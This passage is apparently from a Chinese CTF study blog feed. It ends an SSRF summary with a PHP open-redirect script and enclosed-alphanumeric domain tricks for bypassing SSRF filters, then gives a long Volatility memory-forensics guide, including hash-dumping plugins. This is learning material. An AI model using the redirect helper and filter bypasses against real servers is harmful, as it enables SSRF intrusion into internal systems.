<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$schema</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><span class="hljs-variable">$ip</span>     = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;i&#x27;</span>];<br><span class="hljs-variable">$port</span>   = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-variable">$query</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;q&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$port</span>))&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$schema</span>://<span class="hljs-subst">$ip</span>/<span class="hljs-subst">$query</span>&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$schema</span>://<span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>/<span class="hljs-subst">$query</span>&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="enclosed-alphanumerics-绕过"><a href="#enclosed-alphanumerics-绕过" class="headerlink" title="enclosed alphanumerics 绕过"></a>enclosed alphanumerics 绕过</h2><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com<br>List:<br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ  Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿<br></code></pre></td></tr></table></figure>

<h2 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h2><p><a href="https://xz.aliyun.com/t/7495">从0到1认识DNS重绑定攻击</a></p>
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>ssti学习总结</title>
    <url>/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/ssti%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="4415af594e9c21a7589996feb038f01d1e61bf7e7195157852ca3073ed29082c">c37edc3dc388221caed397fda20028d383bad53d282121946cc4fe32663762cf</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>python</tag>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>misc总结(取证篇)</title>
    <url>/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/misc%E6%80%BB%E7%BB%93(%E5%8F%96%E8%AF%81%E7%AF%87).html</url>
    <content><![CDATA[<h1 id="内存取证工具"><a href="#内存取证工具" class="headerlink" title="内存取证工具"></a>内存取证工具</h1><h2 id="Volatility2"><a href="#Volatility2" class="headerlink" title="Volatility2"></a>Volatility2</h2><blockquote>
<p>Volatility2是一款开源的，基于Python开发的内存取证工具集，可以分析内存中的各种数据。Volatility支持对32位或64位Windows、Linux、Mac、Android操作系统的RAM数据进行提取与分析。</p>
</blockquote>
<h3 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h3><figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text"># 查看imagerinfo获取操作系统类型<br>volatility -f &lt;filename&gt; imageinfo<br><br># 指定操作系统类型进行其他操作<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt;<br><br># 查看进程<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; pslist<br><br># 查看文件<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; filescan | grep -E &quot;txt|xml|png|jpg|gif|zip|rar|7z|pdf|doc|docx|php|py|flag&quot;<br><br># 桌面<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; filescan | grep -E &quot;Desktop&quot;<br><br># 导出文件<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; dumpfiles -Q &lt;virtual address&gt; -D &lt;savedir&gt;<br><br># 获取系统用户名<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; printkey -K &quot;SAM\Domains\Account\Users\Names&quot;<br><br># 查看注册表<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; hivelist<br><br># 提取用户密码<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; hashdump -y &lt;注册表 system 的 virtual 地址&gt; -s &lt;SAM 的 virtual 地址&gt;<br><br># 获取IE浏览器历史记录<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; iehistory<br><br># 查看网络连接<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; netscan<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; connscan<br><br># 将内存中的某个进程数据以 dmp 的格式保存出来<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; memdump -p &lt;pid&gt; -D &lt;savedir&gt;<br><br># 提取进程的可执行文件<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; procdump -p &lt;pid&gt; -D &lt;savedir&gt;<br><br># 查看命令行历史记录<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; cmdscan<br><br># 查看进程命令行参数<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; cmdline<br></code></pre></td></tr></table></figure>



<h3 id="支持的插件列表"><a href="#支持的插件列表" class="headerlink" title="支持的插件列表"></a>支持的插件列表</h3><figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">amcache             # 查看 AmCache 应用程序痕迹信息<br>apihooks            # 检测内核及进程的内存空间中的 API hook<br>atoms               # 列出会话及窗口站 atom 表<br>atomscan            # Atom 表的池扫描(Pool scanner)<br>auditpol            # 列出注册表 HKLM\SECURITY\Policy\PolAdtEv 的审计策略信息<br>bigpools            # 使用 BigPagePoolScanner 转储大分页池(big page pools)<br>bioskbd             # 从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出 BIOS 开机密码)<br>cachedump           # 获取内存中缓存的域帐号的密码哈希<br>callbacks           # 打印全系统通知例程<br>clipboard           # 提取 Windows 剪贴板中的内容<br>cmdline             # 显示进程命令行参数<br>cmdscan             # 提取执行的命令行历史记录（扫描_COMMAND_HISTORY 信息）<br>connections         # 打印系统打开的网络连接(仅支持 Windows XP 和 2003)<br>connscan            # 打印 TCP 连接信息<br>consoles            # 提取执行的命令行历史记录（扫描_CONSOLE_INFORMATION 信息）<br>crashinfo           # 提取崩溃转储信息<br>deskscan            # tagDESKTOP 池扫描(Poolscaner)<br>devicetree          # 显示设备树信息<br>dlldump             # 从进程地址空间转储动态链接库<br>dlllist             # 打印每个进程加载的动态链接库列表<br>driverirp           # IRP hook 驱动检测<br>drivermodule        # 关联驱动对象至内核模块<br>driverscan          # 驱动对象池扫描<br>dumpcerts           # 提取 RAS 私钥及 SSL 公钥<br>dumpfiles           # 提取内存中映射或缓存的文件<br>dumpregistry        # 转储内存中注册表信息至磁盘<br>editbox             # 查看 Edit 编辑控件信息 (Listbox 正在实验中)<br>envars              # 显示进程的环境变量<br>eventhooks          # 打印 Windows 事件 hook 详细信息<br>evtlogs             # 提取 Windows 事件日志(仅支持 XP/2003)<br>filescan            # 提取文件对象（file objects）池信息<br>gahti               # 转储用户句柄（handle）类型信息<br>gditimers           # 打印已安装的 GDI 计时器 (timers) 及回调(callbacks)<br>gdt                 # 显示全局描述符表(Global Descriptor Table)<br>getservicesids      # 获取注册表中的服务名称并返回 SID 信息<br>getsids             # 打印每个进程的 SID 信息<br>handles             # 打印每个进程打开的句柄的列表<br>hashdump            # 转储内存中的 Windows 帐户密码哈希(LM/NTLM)<br>hibinfo             # 转储休眠文件信息<br>hivedump            # 打印注册表配置单元信息<br>hivelist            # 打印注册表配置单元列表<br>hivescan            # 注册表配置单元池扫描<br>hpakextract         # 从 HPAK 文件（Fast Dump 格式）提取物理内存数据<br>hpakinfo            # 查看 HPAK 文件属性及相关信息<br>idt                 # 显示中断描述符表(Interrupt Descriptor Table)<br>iehistory           # 重建 IE 缓存及访问历史记录<br>imagecopy           # 将物理地址空间导出原生 DD 镜像文件<br>imageinfo           # 查看 / 识别镜像信息<br>impscan             # 扫描对导入函数的调用<br>joblinks            # 打印进程任务链接信息<br>kdbgscan            # 搜索和转储潜在 KDBG 值<br>kpcrscan            # 搜索和转储潜在 KPCR 值<br>ldrmodules          # 检测未链接的动态链接 DLL<br>lsadump             # 从注册表中提取 LSA 密钥信息（已解密）<br>machoinfo           # 转储 Mach-O 文件格式信息<br>malfind             # 查找隐藏的和插入的代码<br>mbrparser           # 扫描并解析潜在的主引导记录(MBR)<br>memdump             # 转储进程的可寻址内存<br>memmap              # 打印内存映射<br>messagehooks        # 桌面和窗口消息钩子的线程列表<br>mftparser           # 扫描并解析潜在的 MFT 条目<br>moddump             # 转储内核驱动程序到可执行文件的示例<br>modscan             # 内核模块池扫描<br>modules             # 打印加载模块的列表<br>multiscan           # 批量扫描各种对象<br>mutantscan          # 对互斥对象池扫描<br>notepad             # 查看记事本当前显示的文本<br>objtypescan         # 扫描窗口对象类型对象<br>patcher             # 基于页面扫描的补丁程序内存<br>poolpeek            # 可配置的池扫描器插件<br>printkey            # 打印注册表项及其子项和值<br>privs               # 显示进程权限<br>procdump            # 进程转储到一个可执行文件示例<br>pslist              # 按照 EPROCESS 列表打印所有正在运行的进程<br>psscan              # 进程对象池扫描<br>pstree              # 以树型方式打印进程列表<br>psxview             # 查找带有隐藏进程的所有进程列表<br>qemuinfo            # 转储 Qemu 信息<br>raw2dmp             # 将物理内存原生数据转换为 windbg 崩溃转储格式<br>screenshot          # 基于 GDI Windows 的虚拟屏幕截图保存<br>servicediff         # Windows 服务列表(ala Plugx)<br>sessions            # _MM_SESSION_SPACE 的详细信息列表(用户登录会话)<br>shellbags           # 打印 Shellbags 信息<br>shimcache           # 解析应用程序兼容性 Shim 缓存注册表项<br>shutdowntime        # 从内存中的注册表信息获取机器关机时间<br>sockets             # 打印已打开套接字列表<br>sockscan            # TCP 套接字对象池扫描<br>ssdt                # 显示 SSDT 条目<br>strings             # 物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)<br>svcscan             # windows 服务列表扫描<br>symlinkscan         # 符号链接对象池扫描<br>thrdscan            # 线程对象池扫描<br>threads             # 调查_ETHREAD 和_KTHREADs<br>timeliner           # 创建内存中的各种痕迹信息的时间线<br>timers              # 打印内核计时器及关联模块的 DPC<br>truecryptmaster     # 恢复 TrueCrypt 7.1a 主密钥<br>truecryptpassphrase # 查找并提取 TrueCrypt 密码<br>truecryptsummary    # TrueCrypt 摘要信息<br>unloadedmodules     # 打印卸载的模块信息列表<br>userassist          # 打印注册表中 UserAssist 相关信息<br>userhandles         # 转储用户句柄表<br>vaddump             # 转储 VAD 数据为文件<br>vadinfo             # 转储 VAD 信息<br>vadtree             # 以树形方式显示 VAD 树信息<br>vadwalk             # 显示遍历 VAD 树<br>vboxinfo            # 转储 Virtualbox 信息（虚拟机）<br>verinfo             # 打印 PE 镜像中的版本信息<br>vmwareinfo          # 转储 VMware VMSS/VMSN 信息<br>volshell            # 内存镜像中的 shell<br>windows             # 打印桌面窗口(详细信息)<br>wintree             # Z 顺序打印桌面窗口树<br>wndscan             # 池扫描窗口站<br>yarascan            # 以 Yara 签名扫描进程或内核内存<br></code></pre></td></tr></table></figure>


<h3 id="Linux-内存取证插件参数"><a href="#Linux-内存取证插件参数" class="headerlink" title="Linux 内存取证插件参数"></a>Linux 内存取证插件参数</h3><figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text"># 获取系统进程信息相关命令<br>linux_pstree        # 进程树列表<br>linux_pslist_cache  # 来自的 kmem_cache 活动进程<br>linux_psxview       # 比较进程列表<br>linux_lsof          # 打开文件描述符的每个活动进程<br>linux_pslist        # 活动的进程列表<br>linux_psaux         # 活动的进程列表（输出内容包括更多的细节）<br><br># 获取系统内存信息的相关命令<br>linux_memmap        # 内存映射文件<br>linux_pidhashtable  # Linux 内核中的 PID 散列表<br>linux_proc_maps     # 转储由-s/-vma 参数到磁盘上指定的内存范围。<br>linux_dump_map      # 进程内存的详细信息，包括堆和共享库。<br>linux_bash          # bash 历史文件<br><br># 获取网络接口信息的相关命令<br>linux_arp           # 显示 arp 列表<br>linux_ifconfig      # 显示网络接口详细情况<br>linux_route_cache   # 显示网络路由表<br>linux_netstat       # 查看网络链接情况<br><br># 获取系统硬件信息的相关命令<br>linux_cpuinfo       # 显示 cpu 的相关命令信息。<br>linux_dmesg         # 显示内核缓存信息。<br>linux_iomem         # 显示 io 设备信息。<br>linux_mount         # 显示/proc/mouns 的相关命令信息，主要是挂载的磁盘设备。<br>linux_mount_cache   # 显示 kmem_cache 的相关命令信息。<br>linux_slabinfo      # 显示/proc/slabinfo 的相关命令信息。<br><br># rootkit 检测的相关命令<br>linux_check_afinfo  # 检查篡改网络协议结构。<br>linux_check_creds   # 检查进程共享结构。<br>linux_check_fop     # 检查文件操作数据结构篡改情况。<br>linux_check_idt     # 检查中断描述符表（IDT）的篡改情况。<br>linux_check_syscall # 在系统调用表检查功能情况。<br>linux_check_modules # 检查用于从内核模块列表中缺少在 sysfs 中的项目。<br><br># 获取内核模块信息的相关命令<br>linux_lsmod         # 加载内核模块。<br>linux_tmpfs         # tmpfs 的内容。<br></code></pre></td></tr></table></figure>


<h3 id="Profile"><a href="#Profile" class="headerlink" title="Profile"></a>Profile</h3><p>Volatility自带一些<code>windows</code>系统的<code>profile</code>，<code>Linux</code>系统的<code>Profile</code>需要自己制作，也可以使用第三方的profile文件：<a href="https://github.com/KDPryor/LinuxVolProfiles">https://github.com/KDPryor/LinuxVolProfiles</a></p>
<p>自己制作profile的方法如下：将<code>module.dwarf</code>和<code>system.map</code>打包成一个<code>zip</code>文件，移动到<code>volatility/volatility/plugins/overlays/linux</code>目录中</p>
<p>以<code>centos7</code>为例</p>
<p>先安装<code>dwarfdump</code>（创建module.dwarf文件的依赖）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">yum install -y gcc make gcc-c++ git zip elfutils-devel kernel-devel<br>yum upgrade &amp;&amp; reboot   //解决kernel-devel版本与系统版本不一致的问题<br>wget https://www.prevanders.net/libdwarf-20201201.tar.gz --no-check-certificate<br>tar -zxvf libdwarf-20201201.tar.gz<br><span class="hljs-built_in">cd</span> libdwarf-20201201<br>./configure<br>make<br>make install<br><span class="hljs-built_in">cd</span> ../<br></code></pre></td></tr></table></figure>

<p>在<code>volatility</code>目录中的<code>tool/Linux</code>运行<code>make</code>命令来创建<code>module.dwarf</code>文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/volatilityfoundation/volatility.git<br><span class="hljs-built_in">cd</span> volatility/tools/linux<br>make<br><span class="hljs-built_in">ls</span> -l<br></code></pre></td></tr></table></figure>

<p>打包，将<code>module.dwarf</code>和<code>system.map</code>打包成<code>centos7.zip</code>，移动到分析机的<code>volatility/volatility/plugins/overlays/linux</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">zip centos7.zip /boot/System.map* module.dwarf<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/quzheng-4.png"></p>
<p>ubuntu制作profile：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">apt-get install -y dwarfdump build-essential<br>apt-get install -y linux-kernel-headers kernel-package<br>apt -y upgrade &amp;&amp; reboot //解决kernel-devel版本与系统版本不一致的问题<br><br><span class="hljs-built_in">cd</span> volatility/tools/linux<br>make -C /lib/modules/$(<span class="hljs-built_in">uname</span> -r)/build CONFIG_DEBUG_INFO=y M=<span class="hljs-variable">$PWD</span> modules<br>dwarfdump -di ./module.o &gt; module.dwarf<br>zip ubuntu_5.15.0-69.zip module.dwarf /boot/System.map-$(<span class="hljs-built_in">uname</span> -r)<br></code></pre></td></tr></table></figure>



<h2 id="Volatility3"><a href="#Volatility3" class="headerlink" title="Volatility3"></a>Volatility3</h2><blockquote>
<p>Volatility3是对Volatility2的重写，基于Python3编写，消除了对profile的依赖，使用符号表（配置文件）来匹配内存示例中的操作系统版本。</p>
</blockquote>
<h3 id="符号表"><a href="#符号表" class="headerlink" title="符号表"></a>符号表</h3><p>用于分析相关操作系统数据的内核符号表压缩包。注意：由于Linux内核易于编译且无法唯一区分它们，因此无法轻松提供详尽的Linux符号表集。官方下载地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">wget downloads.volatilityfoundation.org/volatility3/symbols/windows.zip<br>wget downloads.volatilityfoundation.org/volatility3/symbols/mac.zip<br>wget downloads.volatilityfoundation.org/volatility3/symbols/linux.zip<br></code></pre></td></tr></table></figure>

<p>解压后移动到<code>volatility3/volatility/symbols/</code></p>
<h3 id="常用插件"><a href="#常用插件" class="headerlink" title="常用插件"></a>常用插件</h3><p><a href="https://github.com/volatilityfoundation/volatility/wiki/Linux-Command-Reference">linux命令手册</a></p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">banners.Banners                                 Attempts to identify potential linux banners in an image<br>configwriter.ConfigWriter                       Runs the automagics and both prints and outputs configuration in the output directory.<br>frameworkinfo.FrameworkInfo                     Plugin to list the various modular components of Volatility<br>isfinfo.IsfInfo                                 Determines information about the currently available ISF files, or a specific one<br>layerwriter.LayerWriter                         Runs the automagics and writes out the primary layer produced by the stacker.<br>linux.bash.Bash                                 Recovers bash command history from memory.<br>linux.check_afinfo.Check_afinfo                 Verifies the operation function pointers of network protocols.<br>linux.check_creds.Check_creds                   Checks if any processes are sharing credential structures<br>linux.check_idt.Check_idt                       Checks if the IDT has been altered<br>linux.check_modules.Check_modules               Compares module list to sysfs info, if available<br>linux.check_syscall.Check_syscall               Check system call table for hooks.<br>linux.elfs.Elfs                                 Lists all memory mapped ELF files for all processes.<br>linux.keyboard_notifiers.Keyboard_notifiers     Parses the keyboard notifier call chain<br>linux.lsmod.Lsmod                               Lists loaded kernel modules.<br>linux.lsof.Lsof                                 Lists all memory maps for all processes.<br>linux.malfind.Malfind                           Lists process memory ranges that potentially contain injected code.<br>linux.proc.Maps                                 Lists all memory maps for all processes.<br>linux.pslist.PsList                             Lists the processes present in a particular linux memory image.<br>linux.pstree.PsTree                             Plugin for listing processes in a tree based on their parent process ID.<br>linux.tty_check.tty_check                       Checks tty devices for hooks<br>mac.bash.Bash                                   Recovers bash command history from memory.<br>mac.check_syscall.Check_syscall                 Check system call table for hooks.<br>mac.check_sysctl.Check_sysctl                   Check sysctl handlers for hooks.<br>mac.check_trap_table.Check_trap_table           Check mach trap table for hooks.<br>mac.ifconfig.Ifconfig                           Lists loaded kernel modules<br>mac.kauth_listeners.Kauth_listeners             Lists kauth listeners and their status<br>mac.kauth_scopes.Kauth_scopes                   Lists kauth scopes and their status<br>mac.kevents.Kevents                             Lists event handlers registered by processes<br>mac.list_files.List_Files                       Lists all open file descriptors for all processes.<br>mac.lsmod.Lsmod                                 Lists loaded kernel modules.<br>mac.lsof.Lsof                                   Lists all open file descriptors for all processes.<br>mac.malfind.Malfind                             Lists process memory ranges that potentially contain injected code.<br>mac.mount.Mount                                 A module containing a collection of plugins that produce data typically foundin Mac&#x27;s mount command<br>mac.netstat.Netstat                             Lists all network connections for all processes.<br>mac.proc_maps.Maps                              Lists process memory ranges that potentially contain injected code.<br>mac.psaux.Psaux                                 Recovers program command line arguments.<br>mac.pslist.PsList                               Lists the processes present in a particular mac memory image.<br>mac.pstree.PsTree                               Plugin for listing processes in a tree based on their parent process ID.<br>mac.socket_filters.Socket_filters               Enumerates kernel socket filters.<br>mac.timers.Timers                               Check for malicious kernel timers.<br>mac.trustedbsd.Trustedbsd                       Checks for malicious trustedbsd modules<br>mac.vfsevents.VFSevents                         Lists processes that are filtering file system events<br>timeliner.Timeliner                             Runs all relevant plugins that provide time related information and orders the results by time.<br>windows.bigpools.BigPools                       List big page pools.<br>windows.cachedump.Cachedump                     Dumps lsa secrets from memory<br>windows.callbacks.Callbacks                     Lists kernel callbacks and notification routines.<br>windows.cmdline.CmdLine                         Lists process command line arguments.<br>windows.dlllist.DllList                         Lists the loaded modules in a particular windows memory image.<br>windows.driverirp.DriverIrp                     List IRPs for drivers in a particular windows memory image.<br>windows.driverscan.DriverScan                   Scans for drivers present in a particular windows memory image.<br>windows.dumpfiles.DumpFiles                     Dumps cached file contents from Windows memory samples.<br>windows.envars.Envars                           Display process environment variables<br>windows.filescan.FileScan                       Scans for file objects present in a particular windows memory image.<br>windows.getservicesids.GetServiceSIDs           Lists process token sids.<br>windows.getsids.GetSIDs                         Print the SIDs owning each process<br>windows.handles.Handles                         Lists process open handles.<br>windows.hashdump.Hashdump                       Dumps user hashes from memory<br>windows.info.Info                               Show OS &amp; kernel details of the memory sample being analyzed.<br>windows.lsadump.Lsadump                         Dumps lsa secrets from memory<br>windows.malfind.Malfind                         Lists process memory ranges that potentially contain injected code.<br>windows.memmap.Memmap                           Prints the memory map<br>windows.modscan.ModScan                         Scans for modules present in a particular windows memory image.<br>windows.modules.Modules                         Lists the loaded kernel modules.<br>windows.mutantscan.MutantScan                   Scans for mutexes present in a particular windows memory image.<br>windows.netscan.NetScan                         Scans for network objects present in a particular windows memory image.<br>windows.netstat.NetStat                         Traverses network tracking structures present in a particular windows memory image.<br>windows.poolscanner.PoolScanner                 A generic pool scanner plugin.<br>windows.privileges.Privs                        Lists process token privileges<br>windows.pslist.PsList                           Lists the processes present in a particular windows memory image.<br>windows.psscan.PsScan                           Scans for processes present in a particular windows memory image.<br>windows.pstree.PsTree                           Plugin for listing processes in a tree based on their parent process ID.<br>windows.registry.certificates.Certificates      Lists the certificates in the registry&#x27;s Certificate Store.<br>windows.registry.hivelist.HiveList              Lists the registry hives present in a particular memory image.<br>windows.registry.hivescan.HiveScan              Scans for registry hives present in a particular windows memory image.<br>windows.registry.printkey.PrintKey              Lists the registry keys under a hive or specific key value.<br>windows.registry.userassist.UserAssist          Print userassist registry keys and information.<br>windows.ssdt.SSDT                               Lists the system call table.<br>windows.statistics.Statistics<br>windows.strings.Strings                         Reads output from the strings command and indicates which process(es) each string belongs to.<br>windows.svcscan.SvcScan                         Scans for windows services.<br>windows.symlinkscan.SymlinkScan                 Scans for links present in a particular windows memory image.<br>windows.vadinfo.VadInfo                         Lists process memory ranges.<br>windows.vadyarascan.VadYaraScan                 Scans all the Virtual Address Descriptor memory maps using yara.<br>windows.verinfo.VerInfo                         Lists version information from PE files.<br>windows.virtmap.VirtMap                         Lists virtual mapped sections.<br>yarascan.YaraScan                               Scans kernel memory using yara rules (string or file).<br></code></pre></td></tr></table></figure>


<h3 id="Symbol-Tables"><a href="#Symbol-Tables" class="headerlink" title="Symbol Tables"></a>Symbol Tables</h3><p>文件以<code>JSON</code>数据的形式存储，它们可以是<code>.json</code>的纯<code>JSON</code>文件，也可以是<code>.json.gz</code>或<code>.json.xz</code> 的压缩文件。<code>Volatility</code>会在使用时自动解压它们</p>
<p>Volatility3找不到windows的符号表时，会从<code>Microsoft</code>的<code>Symbol Server</code>下载关联的<code>PDB</code>文件，并将其转换为适当的<code>JSON</code>格式，并将其保存在正确的位置。而linux的符号表需要自己构造，可以通过<code>dwarf2json</code>将<code>DWARF</code>文件的内核转换为适当的<code>JSON</code>文件</p>
<p>MacOS Processing</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./dwarf2json mac --macho /path/kernel.dSYM/Contents/Resources/DWARF/kernel \<br>    --macho-symbols /path/kernel &gt; output.json<br></code></pre></td></tr></table></figure>

<p>Linux Processing</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-4.4.0-137-generic &gt; output.json<br></code></pre></td></tr></table></figure>



<h4 id="安装vmlinux"><a href="#安装vmlinux" class="headerlink" title="安装vmlinux"></a>安装vmlinux</h4><p>linux系统默认有<code>vmlinuz</code>，但<code>vmlinux</code>与<code>vmlinuz</code>不同，需要手动安装</p>
<p><strong>方法一：apt安装（推荐）</strong></p>
<p>导入<code>GPG key</code><br><code>apt-key adv --keyserver keyserver.ubuntu.com --recv-keys C8CAB6595FDFF622</code></p>
<p>添加ddebs存储库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">codename=$(lsb_release -c | awk  <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>)<br>sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/ddebs.list &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">deb http://ddebs.ubuntu.com/ $&#123;codename&#125;      main restricted universe multiverse</span><br><span class="hljs-string">deb http://ddebs.ubuntu.com/ $&#123;codename&#125;-security main restricted universe multiverse</span><br><span class="hljs-string">deb http://ddebs.ubuntu.com/ $&#123;codename&#125;-updates  main restricted universe multiverse</span><br><span class="hljs-string">deb http://ddebs.ubuntu.com/ $&#123;codename&#125;-proposed main restricted universe multiverse</span><br><span class="hljs-string">EOF</span><br></code></pre></td></tr></table></figure>

<p>更新软件包<br><code>apt-get update</code></p>
<p>安装kernel debug symbols<br><code>apt-get install linux-image-$(uname -r)-dbgsym</code></p>
<p>包含调试信息的文件称为<code>vmlinuxXXXdebug</code>，其中<code>XXX</code>是内核版本。该文件存储在<code>/usr/lib/debug/boot</code>下</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/quzheng-6.png"></p>
<p><strong>方法二：手动下载安装（不推荐）</strong></p>
<p>在<code>http://ddebs.ubuntu.com/pool/main/l/linux/</code>找到合适的版本后下载到本地</p>
<p><code>dpkg -i</code>安装，安装完成同样在<code>/usr/lib/debug/boot</code>目录下</p>
<p>例如：</p>
<p><code>dpkg -i linux-image-unsigned-5.15.0-60-generic-dbgsym_5.15.0-60.66_amd64.ddeb</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/quzheng-1.jpg"></p>
<p><strong>以上两种方法都是基于ubuntu，而在centos中安装的方法如下：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">yum install -y yum-utils<br>debuginfo-install kernel<br></code></pre></td></tr></table></figure>

<p>查找vmlinux文件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/quzheng-5.png"></p>
<h4 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-5.15.0-60-generic &gt; Ubuntu2004.json<br></code></pre></td></tr></table></figure>

<p>这里要注意内存尽量大于8G，不然会报<code>已杀死</code>的错误</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/quzheng-7.png"></p>
<p>移动<code>json</code>文件到分析机的<code>volatility3/volatility3/framework/symbols/linux/</code></p>
<p><code>python3 vol.py -vvvv isfinfo</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/quzheng-8.png"></p>
<h4 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h4><p>同样注意内存不要太小</p>
